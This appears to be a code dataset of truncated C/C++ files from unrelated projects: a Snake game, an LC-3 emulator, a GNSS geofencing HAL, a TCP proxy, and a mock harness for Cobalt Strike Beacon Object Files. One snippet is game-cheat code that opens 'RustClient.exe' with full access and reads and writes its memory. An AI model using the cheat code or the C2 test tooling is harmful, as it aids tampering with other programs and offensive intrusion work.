    "#include \"../inc/game.hpp\"\n#include <raylib.h>\n#include <stdexcept>\n#include <unistd.h>\n#include <vector>\n\ngame::game(bool debug_log) {\n  if (!debug_log) {\n    SetTraceLogLevel(LOG_NONE);\n  }\n  InitWindow(this->SCREEN_WIDTH, this->SCREEN_HEIGHT, \"Snake\");\n  SetTargetFPS(this->FRAME_RATE);\n}\n\ngame::~game() { CloseWindow(); }\n\nvoid game::run() {\n  this->food.get_new();\n  this->init_map();\n  while (this->should_run()) {\n    this->frame_count++;\n    if (this->frame_count == 60) {\n      this->frame_count = 0;\n    }\n    BeginDrawing();\n    ClearBackground(BLACK);\n    this->get_input();\n    if (this->frame_count % this->player.get_frame_per_move() == 0) {\n      player.move(this->game_map);\n    }\n    this->update_map();\n    this->draw_map();\n    EndDrawing();\n    if (this->player.game_over()) {\n      DrawText(\n          (std::string(\"Score: \") + std::to_string(this->player.get_score()))\n              .c_str(),\n          50, 50, 50, WHITE);\n      DrawText(\"ESC to exit\", 50, 150, 40, WHITE);\n      if (IsKeyPressed(KEY_ESCAPE)) {\n        break;\n      }\n      continue;\n    }\n  }\n}\n\nbool game::should_run() const { return !(WindowShouldClose()); }\n\nvoid game::init_map() {\n  game_map = std::vector<std::vector<BLOCK>>(\n      this->SCREEN_WIDTH / this->BLOCK_SIZE,\n      std::vector<BLOCK>(this->SCREEN_HEIGHT / this->BLOCK_SIZE, BLOCK::EMPTY));\n}\n\nvoid game::draw_map() const {\n  for (size_t i = 0; i < this->game_map.size(); i++) {\n    for (size_t j = 0; j < this->game_map[i].size(); j++) {\n      int x = i * this->BLOCK_SIZE;\n      int y = j * this->BLOCK_SIZE;\n      this->draw_block(x, y, this->game_map[i][j]);\n    }\n  }\n}\n\nvoid game::draw_block(int x, int y, BLOCK type) const {\n  switch (type) {\n  case EMPTY:\n    DrawLine(x, y, x + this->BLOCK_SIZE, y, BROWN);\n    DrawLine(x, y, x, y + this->BLOCK_SIZE, BROWN);\n    DrawLine(x + this->BLOCK_SIZE, y, x + this->BLOCK_SIZE,\n             y + this->BLOCK_SIZE, BROWN);\n    break;\n  case SNAKE_TAIL:\n  case SNAKE_HEAD:\n    DrawRectangle(x, y, this->BLOCK_SIZE, this->BLOCK_SIZE, GREEN);\n    break;\n  case APPLE:\n    DrawRectangle(x, y, this->BLOCK_SIZE, this->BLOCK_SIZE, RED);\n    break;\n  default:\n    throw std::logic_error(\"Invalid block type\");\n    break;\n  }\n}\n\nstd::pair<int, int> game::get_resulution() {\n  return {SCREEN_WIDTH, SCREEN_HEIGHT};\n}\n\nint game::get_block_size() { return BLOCK_SIZE; }\n\nvoid game::update_map() {\n  if (!this->player.game_over()) {\n    if (this->game_map[this->player.get_pos().first]\n                      [this->player.get_pos().second] == BLOCK::APPLE) {\n      this->food.get_new();\n    }\n  }\n  while (\n      this->game_map[this->food.get_pos().first][this->food.get_pos().second] ==\n          BLOCK::SNAKE_HEAD or\n      this->game_map[this->food.get_pos().first][this->food.get_pos().second] ==\n          BLOCK::SNAKE_TAIL) {\n    this->food.get_new();\n  }\n  for (size_t i = 0; i < this->game_map.size(); i++) {\n    for (size_t j = 0; j < this->game_map[i].size(); j++) {\n      this->game_map[i][j] = BLOCK::EMPTY;\n    }\n  }\n  if (!this->player.game_over()) {\n    this->game_map[this->player.get_pos().first]\n                  [this->player.get_pos().second] = BLOCK::SNAKE_HEAD;\n    const std::vector<std::pair<int, int>> player_pos =\n        this->player.get_tail_pos();\n    for (const auto &[x, y] : player_pos) {\n      game_map[x][y] = BLOCK::SNAKE_TAIL;\n    }\n    this->game_map[this->food.get_pos().first][this->food.get_pos().second] =\n        BLOCK::APPLE;\n  }\n}\n\nvoid game::get_input() {\n  if (IsKeyPressed(KEY_W)) {\n    this->player.change_direction(UP);\n  }\n  if (IsKeyPressed(KEY_S)) {\n    this->player.change_direction(DOWN);\n  }\n  if (IsKeyPressed(KEY_D)) {\n    this->player.change_direction(RIGHT);\n  }\n  if (IsKeyPressed(KEY_A)) {\n    this->player.change_direction(LEFT);\n  }\n}\n",
    "#include <stdio.h>\n#include <stdint.h>\n#include <signal.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/termios.h>\n#include <sys/mman.h>\n#include <cstring>\n/* for MCPI */\n#include <mcpp/mcpp.h>\n#include <mcpp/util.h>\n\nmcpp::MinecraftConnection *mc;\n\n// Converts a byte into string of binary digits\n#define BYTE_TO_BINARY_PATTERN \"%c%c%c%c%c%c%c%c\"\n#define BYTE_TO_BINARY(byte)   \\\n  ((byte) & 0x80 ? '1' : '0'), \\\n  ((byte) & 0x40 ? '1' : '0'), \\\n  ((byte) & 0x20 ? '1' : '0'), \\\n  ((byte) & 0x10 ? '1' : '0'), \\\n  ((byte) & 0x08 ? '1' : '0'), \\\n  ((byte) & 0x04 ? '1' : '0'), \\\n  ((byte) & 0x02 ? '1' : '0'), \\\n  ((byte) & 0x01 ? '1' : '0') \n\nenum \n{\n    FLAG_SIG = 'd', // signed\n    FLAG_HEX = 'x', // hex\n    FLAG_BIN = 'b', // binary\n    FLAG_SUP = 's'  // suppress run info\n};\nenum\n{\n    R_R0 = 0,\n    R_R1,\n    R_R2,\n    R_R3,\n    R_R4,\n    R_R5,\n    R_R6,\n    R_R7,\n    R_PC, /* program counter */\n    R_COND,\n    R_COUNT\n};\nenum\n{\n    FL_POS = 1 << 0, /* P */\n    FL_ZRO = 1 << 1, /* Z */\n    FL_NEG = 1 << 2, /* N */\n};\nenum\n{\n    OP_BR = 0, /* branch */\n    OP_ADD,    /* add  */\n    OP_LD,     /* load */\n    OP_ST,     /* store */\n    OP_JSR,    /* jump register */\n    OP_AND,    /* bitwise and */\n    OP_LDR,    /* load register */\n    OP_STR,    /* store register */\n    OP_RTI,    /* unused */\n    OP_NOT,    /* bitwise not */\n    OP_LDI,    /* load indirect */\n    OP_STI,    /* store indirect */\n    OP_JMP,    /* jump */\n    OP_RES,    /* reserved (unused) */\n    OP_LEA,    /* load effective address */\n    OP_TRAP    /* execute trap */\n};\n\nenum\n{\n    MR_KBSR = 0xFE00, /* keyboard status */\n    MR_KBDR = 0xFE02  /* keyboard data */\n};\nenum\n{\n    TRAP_GETC = 0x20,            /* get character from keyboard, not echoed onto the terminal */\n    TRAP_OUT = 0x21,             /* output a character */\n    TRAP_PUTS = 0x22,            /* output a word string */\n    TRAP_IN = 0x23,              /* get character from keyboard, echoed onto the terminal */\n    TRAP_PUTSP = 0x24,           /* output a byte string */\n    TRAP_HALT = 0x25,            /* halt the program */\n    TRAP_REG = 0x27,             // print registers to console\n    TRAP_CHAT = 0x28,            // post string to chat\n    TRAP_GETP = 0x29,            // get player tile\n    TRAP_SETP = 0x2A,            // set player tile\n    TRAP_GETB = 0x2B,            // get block type\n    TRAP_SETB = 0x2C,            // set block type\n    TRAP_GETH = 0x2D,            // get height\n    \n};\n\n#define MEMORY_MAX (1 << 16)\nuint16_t memory[MEMORY_MAX];  /* 65536 locations */\nuint16_t reg[R_COUNT];\nuint16_t flag;\n\n// tracking\nuint32_t inst_count = 0;\nuint32_t api_calls = 0;\n\nstruct termios original_tio;\n\nbool flag_set(uint16_t chk_flag) {\n    return flag == chk_flag;\n}\n\nvoid disable_input_buffering()\n{\n    tcgetattr(STDIN_FILENO, &original_tio);\n    struct termios new_tio = original_tio;\n    new_tio.c_lflag &= ~ICANON & ~ECHO;\n    tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);\n}\n\nvoid restore_input_buffering()\n{\n    tcsetattr(STDIN_FILENO, TCSANOW, &original_tio);\n}\n\nuint16_t check_key()\n{\n    fd_set readfds;\n    FD_ZERO(&readfds);\n    FD_SET(STDIN_FILENO, &readfds);\n\n    struct timeval timeout;\n    timeout.tv_sec = 0;\n    timeout.tv_usec = 0;\n    return select(1, &readfds, NULL, NULL, &timeout) != 0;\n}\nvoid handle_interrupt(int signal)\n{\n    restore_input_buffering();\n    printf(\"\\n\");\n    exit(-2);\n}\nuint16_t sign_extend(uint16_t x, int bit_count)\n{\n    if ((x >> (bit_count - 1)) & 1) {\n        x |= (0xFFFF << bit_count);\n    }\n    return x;\n}\nuint16_t swap16(uint16_t x)\n{\n    return (x << 8) | (x >> 8);\n}\nvoid update_flags(uint16_t r)\n{\n    if (reg[r] == 0)\n    {\n        reg[R_COND] = FL_ZRO;\n    }\n    else if (reg[r] >> 15) /* a 1 in the left-most bit indicates negative */\n    {\n        reg[R_COND] = FL_NEG;\n    }\n    else\n    {\n        reg[R_COND] = FL_POS;\n    }\n}\nvoid read_image_file(FILE* file)\n{\n    /* the origin tells us where in memory to place the image */\n    uint16_t origin;\n    fread(&origin, sizeof(origin), 1, file);\n    origin = swap16(origin);\n\n    /* we know the maximum file size so we only need one fread */\n    uint16_t max_read = MEMORY_MAX - origin;\n    uint16_t* p = memory + origin;\n    size_t read = fread(p, sizeof(uint16_t), max_read, file);\n\n    /* swap to little endian */\n    while (read-- > 0)\n    {\n        *p = swap16(*p);\n        ++p;\n    }\n}\nint read_image(const char* image_path)\n{\n    FILE* file = fopen(image_path, \"rb\");\n    if (!file) { return 0; };\n    read_image_file(file);\n    fclose(file);\n    return 1;\n}\nvoid mem_write(uint16_t address, uint16_t val)\n{\n    memory[address] = val;\n}\nint unsigned_to_signed(uint16_t u)\n{\n    return (u + 32768) % 65536 - 32768;\n}\nuint16_t mem_read(uint16_t address)\n{\n    if (address == MR_KBSR)\n    {\n        if (check_key())\n        {\n            memory[MR_KBSR] = (1 << 15);\n            memory[MR_KBDR] = getchar();\n        }\n        else\n    ",
    "#include <Windows.h>\r\n#include <winternl.h>\r\n#include <Psapi.h>\r\n#include \"um.h\"\r\nbool cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup( ) {HANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );if ( ss ) {HANDLE process = NULL;PROCESSENTRY32 pe;pe.dwSize = sizeof( PROCESSENTRY32 );if ( Process32First( ss, &pe ) ) {do {if ( !wcscmp( pe.szExeFile, ( L\"RustClient.exe\" ) ) ) {process = OpenProcess( PROCESS_ALL_ACCESS, false, pe.th32ProcessID );}} while ( Process32Next( ss, &pe ) );}CloseHandle( ss );crazy_process_handle = process;}return crazy_process_handle;}\r\nvoid cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read( uintptr_t address, void* buffer, size_t size ) {if (crazy_process_handle )ReadProcessMemory(crazy_process_handle, ( LPCVOID )address, buffer, size, 0 );}\r\nvoid cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_write( uintptr_t address, void* buffer, size_t size ) {if (crazy_process_handle )WriteProcessMemory(crazy_process_handle, ( LPVOID )address, &buffer, size, NULL );}\r\ncant_remove_due_to_strict_nda::crazy_material_dumper::crazymodule_t cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module( const std::wstring& name ) {crazymodule_t mod = { 0 };HANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetProcessId(crazy_process_handle ) );if ( ss ) {MODULEENTRY32 me;me.dwSize = sizeof( MODULEENTRY32 );if ( Module32First( ss, &me ) ) {do {if ( !wcscmp( me.szModule, name.data( ) ) ) {mod.crazy_base = ( uint64_t )me.modBaseAddr;mod.crazy_size = ( uint64_t )me.modBaseSize;break;}} while ( Module32Next( ss, &me ) );}CloseHandle( ss );}return mod;}",
    "/*\n * Copyright (c) 2017-2019, The Linux Foundation. All rights reserved.\n * Not a Contribution\n */\n/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"GnssHal_GnssGeofencing\"\n\n#include <log_util.h>\n#include <GeofenceAPIClient.h>\n#include \"GnssGeofencing.h\"\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace V2_0 {\nnamespace implementation {\n\nvoid GnssGeofencing::GnssGeofencingDeathRecipient::serviceDied(\n        uint64_t cookie, const wp<IBase>& who) {\n    LOC_LOGE(\"%s] service died. cookie: %llu, who: %p\",\n            __FUNCTION__, static_cast<unsigned long long>(cookie), &who);\n    if (mGnssGeofencing != nullptr) {\n        mGnssGeofencing->removeAllGeofences();\n    }\n}\n\nGnssGeofencing::GnssGeofencing() : mApi(nullptr) {\n    mGnssGeofencingDeathRecipient = new GnssGeofencingDeathRecipient(this);\n}\n\nGnssGeofencing::~GnssGeofencing() {\n    if (mApi != nullptr) {\n        mApi->destroy();\n        mApi = nullptr;\n    }\n}\n\n// Methods from ::android::hardware::gnss::V1_0::IGnssGeofencing follow.\nReturn<void> GnssGeofencing::setCallback(const sp<IGnssGeofenceCallback>& callback)  {\n    if (mApi != nullptr) {\n        LOC_LOGd(\"mApi is NOT nullptr\");\n        return Void();\n    }\n\n    mApi = new GeofenceAPIClient(callback);\n    if (mApi == nullptr) {\n        LOC_LOGE(\"%s]: failed to create mApi\", __FUNCTION__);\n    }\n\n    if (mGnssGeofencingCbIface != nullptr) {\n        mGnssGeofencingCbIface->unlinkToDeath(mGnssGeofencingDeathRecipient);\n    }\n    mGnssGeofencingCbIface = callback;\n    if (mGnssGeofencingCbIface != nullptr) {\n        mGnssGeofencingCbIface->linkToDeath(mGnssGeofencingDeathRecipient, 0 /*cookie*/);\n    }\n\n    return Void();\n}\n\nReturn<void> GnssGeofencing::addGeofence(\n        int32_t geofenceId,\n        double latitudeDegrees,\n        double longitudeDegrees,\n        double radiusMeters,\n        IGnssGeofenceCallback::GeofenceTransition lastTransition,\n        int32_t monitorTransitions,\n        uint32_t notificationResponsivenessMs,\n        uint32_t unknownTimerMs)  {\n    if (mApi == nullptr) {\n        LOC_LOGE(\"%s]: mApi is nullptr\", __FUNCTION__);\n    } else {\n        mApi->geofenceAdd(\n                geofenceId,\n                latitudeDegrees,\n                longitudeDegrees,\n                radiusMeters,\n                static_cast<int32_t>(lastTransition),\n                monitorTransitions,\n                notificationResponsivenessMs,\n                unknownTimerMs);\n    }\n    return Void();\n}\n\nReturn<void> GnssGeofencing::pauseGeofence(int32_t geofenceId)  {\n    if (mApi == nullptr) {\n        LOC_LOGE(\"%s]: mApi is nullptr\", __FUNCTION__);\n    } else {\n        mApi->geofencePause(geofenceId);\n    }\n    return Void();\n}\n\nReturn<void> GnssGeofencing::resumeGeofence(int32_t geofenceId, int32_t monitorTransitions)  {\n    if (mApi == nullptr) {\n        LOC_LOGE(\"%s]: mApi is nullptr\", __FUNCTION__);\n    } else {\n        mApi->geofenceResume(geofenceId, monitorTransitions);\n    }\n    return Void();\n}\n\nReturn<void> GnssGeofencing::removeGeofence(int32_t geofenceId)  {\n    if (mApi == nullptr) {\n        LOC_LOGE(\"%s]: mApi is nullptr\", __FUNCTION__);\n    } else {\n        mApi->geofenceRemove(geofenceId);\n    }\n    return Void();\n}\n\nReturn<void> GnssGeofencing::removeAllGeofences()  {\n    if (mApi == nullptr) {\n        LOC_LOGD(\"%s]: mApi is nullptr, do nothing\", __FUNCTION__);\n    } else {\n        mApi->geofenceRemoveAll();\n    }\n    return Void();\n}\n\n}  // namespace implementation\n}  // namespace V2_0\n}  // namespace gnss\n}  // namespace hardware\n}  // namespace android\n",
    "#include \"proxy.h\"\n\nProxyServer::Socket::Socket() : sock_addr_() {\n  sockfd_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (sockfd_ != -1) {\n    memset(&sock_addr_, 0, sizeof(sock_addr_));\n  }\n}\n\nProxyServer::Socket::Socket(Socket &&other) noexcept : sock_addr_() {\n  sockfd_ = other.sockfd_;\n  other.sockfd_ = -1;\n  memcpy(&sock_addr_, &other.sock_addr_, sizeof(sock_addr_));\n}\n\nProxyServer::Socket::~Socket() {\n  if (sockfd_ != -1) {\n    shutdown(sockfd_, SHUT_RDWR);\n    close(sockfd_);\n  }\n}\n\nint ProxyServer::Socket::SetBind(const std::string &address, int port) {\n  sock_addr_.sin_family = AF_INET;\n  sock_addr_.sin_port = htons(port);\n  sock_addr_.sin_addr.s_addr = inet_addr(address.c_str());\n  return bind(sockfd_, reinterpret_cast<sockaddr *>(&sock_addr_),\n              sizeof(sock_addr_));\n}\n\nint ProxyServer::Socket::SetConnect(const std::string &address, int port) {\n  sock_addr_.sin_family = AF_INET;\n  sock_addr_.sin_port = htons(port);\n  sock_addr_.sin_addr.s_addr = inet_addr(address.c_str());\n\n  return connect(sockfd_, reinterpret_cast<sockaddr *>(&sock_addr_),\n                 sizeof(sock_addr_));\n}\n\nbool ProxyServer::Socket::SetAccept(int proxy_socket) {\n  socklen_t address_length = sizeof(sock_addr_);\n  if ((sockfd_ = accept(proxy_socket, reinterpret_cast<sockaddr *>(&sock_addr_),\n                        &address_length)) == -1) {\n    std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u0438\u043d\u044f\u0442\u044c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435 \u043e\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430. \";\n  }\n  return sockfd_ != -1;\n}\n\nint ProxyServer::Socket::GetDescriptor() const { return sockfd_; }\n\nsockaddr_in ProxyServer::Socket::GetAddress() const noexcept {\n  return sock_addr_;\n}\n\nProxyServer::ProxyServer(int proxy_port) : all_sockets_(), server_state_(true) {\n  if (!CreateProxyServer(proxy_port)) {\n    server_state_ = false;\n  }\n}\n\nbool ProxyServer::CreateProxyServer(int proxy_port) {\n  Socket proxy_socket;\n  if (proxy_socket.GetDescriptor() == -1) {\n    perror(\"\\\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u043e\u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0441\u043e\u043a\u0435\u0442. (\u0421\u043e\u043a\u0435\u0442 \"\n           \"\u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430).\\n\");\n    return false;\n  }\n\n  if (proxy_socket.SetBind(\"127.0.0.1\", proxy_port) == -1) {\n    perror(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u0438\u0432\u044f\u0437\u043a\u0435 \u0441\u043e\u043a\u0435\u0442\u0430 \u043a \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u043e\u043c\u0443 \u0430\u0434\u0440\u0435\u0441\u0443 \u0438 \u043f\u043e\u0440\u0442\u0443. (\u0421\u043e\u043a\u0435\u0442 \"\n           \"\u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430).\\n\");\n    return false;\n  }\n\n  if (listen(proxy_socket.GetDescriptor(), SOMAXCONN) == -1) {\n    perror(\"\u041d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u0441\u043e\u043a\u0435\u0442 \u0432 \u0440\u0435\u0436\u0438\u043c \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u044f. (\u0421\u043e\u043a\u0435\u0442 \"\n           \"\u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430).\\n\");\n    return false;\n  }\n\n  all_sockets_.push_back(std::move(proxy_socket));\n  return true;\n}\n\nbool ProxyServer::ConnectionServer(const std::string &server_address,\n                                   int server_port) {\n  Socket server_socket;\n  if (server_socket.GetDescriptor() == -1) {\n    perror(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u043e\u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0441\u043e\u043a\u0435\u0442. (\u0421\u043e\u043a\u0435\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \"\n           \"\u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f).\\n\");\n    return false;\n  }\n\n  if (server_socket.SetConnect(server_address, server_port) == -1) {\n    perror(\"\u041d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0435\u0440\u0432\u0435\u0440\u0443 \u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f. (\u0421\u043e\u043a\u0435\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \"\n           \"\u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f).\\n\");\n    return false;\n  }\n\n  all_sockets_.push_back(std::move(server_socket));\n  return true;\n}\n\nvoid ProxyServer::AcceptConnection(const std::string &server_address,\n                                   int server_port) {\n  Socket slave_socket;\n\n  if (!ConnectionServer(server_address, server_port)) {\n    std::cout << \"\u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0442\u044b...\" << std::endl;\n  }\n\n  if (slave_socket.SetAccept(all_sockets_.front().GetDescriptor())) {\n    std::cout << \"\u0423\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u043a\u043b\u0438\u0435\u043d\u0442\u0430: \" << GetSocketName(slave_socket)\n              << \" \u043a \u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0443.\" << std::endl;\n    all_sockets_.push_back(std::move(slave_socket));\n  } else {\n    std::cout << GetSocketName(slave_socket) << std::endl;\n  }\n}\n\nbool ProxyServer::HandleServer(std::list<Socket>::iterator &server_iter) {\n  auto client_iter = server_iter;\n  ++client_iter;\n  char buffer[1024];\n  memset(buffer, 0, 1024);\n\n  ssize_t bytes_read;\n  if ((bytes_read = recv(server_iter->GetDescriptor(), buffer, sizeof(buffer),\n                         0)) == -1) {\n    std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u043a\u043e\u043d\u0435\u0447\u043d\u043e\u0433\u043e \u0441\u0435\u0440\u0432\u0435\u0440\u0430.\"\n              << std::endl;\n    return false;\n  }\n\n  if (send(client_iter->GetDescriptor(), buffer, bytes_read, 0) == -1) {\n    std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440.\" << std::endl;\n    return false;\n  }\n\n  return true;\n}\n\nbool ProxyServer::HandleClient(std::list<Socket>::iterator &client_iter,\n                               const std::list<std::string> &keywords,\n                               std::ofstream &file) {\n  auto server_iter = client_iter;\n  --server_iter;\n  char buffer[1024];\n  memset(buffer, 0, 1024);\n\n  ssize_t bytes_read =\n      recv(client_iter->GetDescriptor(), buffer, sizeof(buffer), MSG_NOSIGNAL);\n  if (bytes_read <= 0) {\n    if (bytes_read == -1) {\n      std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0447\u0442\u0435\u043d\u0438\u0438 \u0434\u0430\u043d\u043d\u044b\u0445 \u0441 \u043a\u043b\u0438\u0435\u043d\u0442\u0430.\" << std::endl;\n    }\n    return false;\n  }\n\n  std::string words(buffer, bytes_read);\n  // \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u043d\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \"stop;\" \u0441 \u043a\u043b\u0438\u0435\u043d\u0442\u0430 - \u0440\u0430\u0431\u043e\u0442\u0430 \u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430\n  // \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u0442\u0441\u044f;\n  if (words.find(\"stop\")",
    "#include <iostream>\n#include <cstdio>\n#include <vector>\n#include <algorithm>\n#include <utility>\n#include <cstring>\n#include <map>\n#include <Windows.h>\n\n#include \"mock.h\"\n#include \"..\\beacon_user_data.h\"\n\nextern \"C\" {\n#ifdef _DEBUG\n#undef DECLSPEC_IMPORT\n#define DECLSPEC_IMPORT\n#endif\n#include \"..\\beacon.h\"\n}\n\nnamespace bof {\n    namespace utils {\n        template <typename T>\n        T swapEndianness(T value) {\n            char *ptr = reinterpret_cast<char *>(&value);\n            std::reverse(ptr, ptr + sizeof(T));\n            return value;\n        }\n\n        template <typename T>\n        std::vector<char> toBytes(T input) {\n            char *ptr = reinterpret_cast<char *>(&input);\n            return std::vector<char>(ptr, ptr + sizeof(T));\n        }\n\n        const char* typeToStr(int callbackType) {\n            switch (callbackType) {\n                case CALLBACK_OUTPUT: return \"CALLBACK_OUTPUT\";\n                case CALLBACK_OUTPUT_OEM: return \"CALLBACK_OUTPUT_OEM\";\n                case CALLBACK_ERROR: return \"CALLBACK_ERROR\";\n                case CALLBACK_OUTPUT_UTF8: return \"CALLBACK_OUTPUT_UTF8\";\n                default: return \"CALLBACK_UNKOWN\";\n            }\n        }\n    }\n\n    namespace mock {\n        char *BofData::get() {\n            return size() > 0 ? reinterpret_cast<char *>(&data[0]) : nullptr;\n        }\n\n        int BofData::size() {\n            return data.size();\n        }\n\n        void BofData::addData(const char *buf, std::size_t len) {\n            std::vector<char> bytes;\n            bytes.assign(buf, buf + len);\n            insert(static_cast<int>(len));\n            append(bytes);\n        }\n\n        void BofData::append(const std::vector<char> &data) {\n            this->data.insert(std::end(this->data), std::begin(data), std::end(data));\n        }\n\n        void BofData::insert(int v) {\n            append(bof::utils::toBytes(bof::utils::swapEndianness(v)));\n        }\n\n        void BofData::insert(short v) {\n            append(bof::utils::toBytes(bof::utils::swapEndianness(v)));\n        }\n\n        void BofData::insert(unsigned int v) {\n            insert(static_cast<int>(v));\n        }\n\n        void BofData::insert(unsigned short v) {\n            insert(static_cast<short>(v));\n        }\n\n        void BofData::insert(const char *v) {\n            addData(v, std::strlen(v) + 1);\n        }\n\n        void BofData::insert(const wchar_t *v) {\n            addData((const char *)v, (std::wcslen(v) + 1) * sizeof(wchar_t));\n        }\n\n        void BofData::insert(const std::vector<char>& data) {\n            pack<int32_t>(data.size());\n            append(data);\n        }\n    }\n\n    namespace output {\n        std::vector<OutputEntry> outputs;\n\n        void addEntry(int type, const char* data, int len) {\n            OutputEntry output = {\n                type,\n                std::string(data, data + len)\n            };\n            outputs.push_back(output);\n        }\n\n        const std::vector<OutputEntry>& getOutputs() {\n            return outputs;\n        }\n\n        void reset() {\n            outputs.clear();\n        }\n\n        void PrintTo(const OutputEntry& o, std::ostream* os) {\n            *os << \"{ callbackType: \" << bof::utils::typeToStr(o.callbackType) << \", output: \" << o.output << \" }\";\n        }\n    }\n\n    namespace valuestore {\n        std::map<std::string, void*> values;\n\n        void reset() {\n            values.clear();\n        }\n    }\n\n    namespace bud {\n        char custom[BEACON_USER_DATA_CUSTOM_SIZE] = { 0 };\n\n        void reset() {\n            std::memset(custom, 0, BEACON_USER_DATA_CUSTOM_SIZE);\n        }\n\n        void set(const char* data) {\n            if (data) {\n                std::memcpy(custom, data, BEACON_USER_DATA_CUSTOM_SIZE);\n            }\n        }\n    }\n}\n\nextern \"C\"\n{\n    // Print API\n    void BeaconPrintf(int type, char *fmt, ...) {\n        printf(\"[Output Callback: %s (0x%X)]\\n\", bof::utils::typeToStr(type), type);\n        va_list args;\n        va_start(args, fmt);\n        int size = vsnprintf(nullptr, 0, fmt, args);\n        if (size >= 0) {\n            char* buffer = new char[size + 1];\n            vsnprintf(buffer, size + 1, fmt, args);\n            bof::output::addEntry(type, buffer, size);\n            delete[] buffer;\n        }\n        vprintf(fmt, args);\n        printf(\"\\n\");\n        va_end(args);\n    }\n\n    void BeaconOutput(int type, char *data, int len) {\n        bof::output::addEntry(type, data, len);\n        printf(\"[Output Callback: %s (0x%X)]\\n%.*s\", bof::utils::typeToStr(type), type, len, data);\n    }\n\n    // Parser API\n    void BeaconDataParse(datap *parser, char *buffer, int size) {\n        parser->buffer = buffer;\n        parser->original = buffer;\n        parser->size = size;\n        parser->length = size;\n    }\n\n    int BeaconDataInt(datap *parser) {\n        int value = *(int *)(parser->buffer);\n        parser->buffer += sizeof(int);\n        parser->length -= sizeof(int);\n        return bof::utils::swapEndianness(value);\n    }\n\n    short BeaconD",
